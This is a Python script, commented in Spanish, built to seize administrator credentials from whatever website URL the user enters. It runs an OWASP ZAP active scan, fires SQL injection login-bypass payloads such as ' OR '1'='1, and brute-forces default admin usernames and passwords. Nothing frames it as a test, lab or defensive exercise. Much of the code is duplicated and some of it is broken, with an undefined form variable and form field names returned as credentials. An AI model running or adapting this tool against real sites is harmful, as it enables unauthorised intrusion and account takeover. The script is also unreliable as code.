import requests
from bs4 import BeautifulSoup
from zapv2 import ZAPv2
import base64
import string
import random
import threading
import time
import json

# Configuración de ZAP
ZAP_API_KEY = 'api de zap'
ZAP_ADDRESS = 'http://127.0.0.1:8080'

# Inicializar ZAP
zap = ZAPv2(proxies={'http': ZAP_ADDRESS, 'https': ZAP_ADDRESS}, apikey=ZAP_API_KEY)

def obtener_credenciales_admin(url):
    # Abrir la URL en ZAP
    zap.urlopen(url)
    zap.forceRefresh()

    # Escanear la URL para encontrar formularios
    scan_id = zap.ascan.scan(url)
    while int(zap.ascan.status(scan_id)) < 100:
        time.sleep(2)

    # Obtener los resultados del escaneo
    alerts = zap.core.alerts(baseurl=url)
    for alert in alerts:
        if 'login' in alert['alert'] or 'admin' in alert['alert']:
            print(f"Alerta encontrada: {alert['alert']}")
            print(f"Descripción: {alert['description']}")
            print(f"Solución: {alert['solution']}")
            print(f"Riesgo: {alert['risk']}")
            print(f"Confianza: {alert['confidence']}")
            print(f"URL: {alert['url']}")
            print(f"Método: {alert['method']}")
            print(f"Parámetros: {alert['parameter']}")
            print(f"Evidence: {alert['evidence']}")
            print(f"CWE ID: {alert['cweid']}")
            print(f"WASC ID: {alert['wascid']}")
            print(f"Referencia: {alert['reference']}")
            print("\n")

    # Intentar inyección SQL
    payloads = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1--", "' OR 'x'='x"]
    for payload in payloads:
        data = {'username': payload, 'password': payload}
        response = requests.post(url, data=data)
        if 'admin' in response.text:
            print(f"Posible inyección SQL exitosa con payload: {payload}")

    # Intentar fuerza bruta
    usernames = ['admin', 'administrator', 'root', 'superuser']
    passwords = ['admin', 'password', '12345', 'qwerty', 'letmein']
    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if 'admin' in response.text or 'dashboard' in response.text:
                print(f"Credenciales encontradas: {username}:{password}")
                return username, password

    # Analizar el HTML de la página para encontrar el formulario de administrador
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        if 'admin' in form.get('action', '').lower() or 'login' in form.get('action', '').lower():
            admin_form = form
            break

    if admin_form:
        inputs = admin_form.find_all('input')
        admin_username = None
        admin_password = None
        for input_tag in inputs:
            if 'username' in input_tag.get('name', '').lower() or 'user' in input_tag.get('name', '').lower():
                admin_username = input_tag.get('name', '')
            elif 'password' in input_tag.get('name', '').lower() or 'pass' in input_tag.get('name', '').lower():
                admin_password = input_tag.get('name', '')

        if admin_username and admin_password:
            print(f"Campo de usuario: {admin_username}")
            print(f"Campo de contraseña: {admin_password}")
            return admin_username, admin_password
        else:
            print("No se encontraron campos de usuario y contraseña en el formulario de administrador.")
            return None, None
    else:
        print("No se encontró un formulario de administrador en la página.")
        return None, None

def generar_payloads_sql():
    payloads = []
    for _ in range(100):
        payload = "' OR '1'='1"
        payloads.append(payload)
    return payloads

def intentar_inyeccion_sql(url, payloads):
    for payload in payloads:
        data = {'username': payload, 'password': payload}
        response = requests.post(url, data=data)
        if 'admin' in response.text:
            print(f"Posible inyección SQL exitosa con payload: {payload}")

def intentar_fuerza_bruta(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if 'admin' in response.text or 'dashboard' in response.text:
                print(f"Credenciales encontradas: {username}:{password}")
                return username, password
    return None, None

def analizar_html(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        if 'admin' in form.get('action', '').lower() or 'login' in form.get('action', '').lower():
            admin_form = form
            break

    if admin_form:
        inputs = admin_form.find_all('input')
        admin_username = None
        admin_password = None
        for input_tag in inputs:
            if 'username' in input_tag.get('name', '').lower() or 'user' in input_tag.get('name', '').lower():
                admin_username = input_tag.get('name', '')
            elif 'password' in input_tag.get('name', '').lower() or 'pass' in input_tag.get('name', '').lower():
                admin_password = input_tag.get('name', '')

        if admin_username and admin_password:
            print(f"Campo de usuario: {admin_username}")
            print(f"Campo de contraseña: {admin_password}")
            return admin_username, admin_password
        else:
            print("No se encontraron campos de usuario y contraseña en el formulario de administrador.")
            return None, None
    else:
        print("No se encontró un formulario de administrador en la página.")
        return None, None

def escanear_con_zap(url):
    # Abrir la URL en ZAP
    zap.urlopen(url)
    zap.forceRefresh()

    # Escanear la URL para encontrar formularios
    scan_id = zap.ascan.scan(url)
    while int(zap.ascan.status(scan_id)) < 100:
        time.sleep(2)

    # Obtener los resultados del escaneo
    alerts = zap.core.alerts(baseurl=url)
    for alert in alerts:
        if 'login' in alert['alert'] or 'admin' in alert['alert']:
            print(f"Alerta encontrada: {alert['alert']}")
            print(f"Descripcióp: {alert['description']}")
            print(f"Solucion: {alert['solution']}")
            print(f"Riesgo: {alert['risk']}")
            print(f"Confianza: {alert['confidence']}")
            print(f"URL: {alert['url']}")
            print(f"Metodo: {alert['method']}")
            print(f"Parametros: {alert['parameter']}")
            print(f"Evidence: {alert['evidence']}")
            print(f"CWE ID: {alert['cweid']}")
            print(f"WASC ID: {alert['wascid']}")
            print(f"Referencia: {alert['reference']}")
            print("\n")

def main():
    url = input("Ingresa la URL de la web: ")
    admin_username, admin_password = obtener_credenciales_admin(url)
    if admin_username and admin_password:
        print(f"Credenciales de administrador encontradas:")
        print(f"Usuario: {admin_username}")
        print(f"Contraseña: {admin_password}")
    else:
        print("No se pudieron obtener las credenciales de administrador.")

if __name__ == "__main__":
    main()
